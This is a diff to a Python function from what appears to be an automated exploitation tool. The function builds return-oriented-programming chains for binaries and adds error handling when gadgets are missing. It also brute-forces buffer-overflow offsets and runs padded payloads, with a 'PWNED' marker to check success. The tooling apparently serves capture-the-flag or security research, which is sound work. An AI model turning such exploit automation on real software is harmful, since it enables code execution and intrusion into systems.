@@ -341,19 +341,27 @@ def autorop(binary: str, offset=None, run: bool = True) -> dict:
     if not built:
         return {"ok": False, "note": "no se pudo construir cadena automatica (sin /bin/sh o "
                 "gadgets suficientes; ret2libc dinamico necesita libc/leak)"}
-    chain = rop.chain()
+    try:
+        chain = rop.chain()
+    except Exception as e:
+        # p.ej. falta un 'pop rdi' para colocar el argumento: la cadena es insatisfactible.
+        return {"ok": False, "note": f"no se pudo resolver la cadena ROP (gadget faltante: {e}). "
+                "Prueba ret2win (autopoc) o ret2libc con leak (autolibc)."}
     marker = "BINORACLE_PWNED"
-    if offset is None:
-        offset = find_pc_offset(binary)
     res = {"ok": True, "verified": False, "offset": offset, "strategy": strategy,
            "chain": rop.dump()}
     if offset is not None:
         res["payload_hex"] = (b"A" * offset + chain).hex()
 
     if run:
-        # if we have an offset, run it directly; otherwise SEARCH the offset dynamically
-        candidates = [offset] if offset is not None else \
-            [72, 64, 88, 56, 40, 96, 104, 120, 128, 136, 48, 80, 112, 32, 24, 16, 144, 152, 160]
+        # Offsets a probar: el explicito si lo hay; si no, los buenos candidatos (r2 estatico +
+        # angr valido, descartando el 0 bogus) PRIMERO, y una lista comun de respaldo despues.
+        _brute = [72, 64, 88, 56, 40, 96, 104, 120, 128, 136, 48, 80, 112, 32, 24, 16, 144, 152, 160]
+        if offset is not None:
+            candidates = [offset]
+        else:
+            candidates = _offset_candidates(binary, None)
+            candidates += [c for c in _brute if c not in candidates]
         for cand in candidates:
             if cand is None:
                 continue
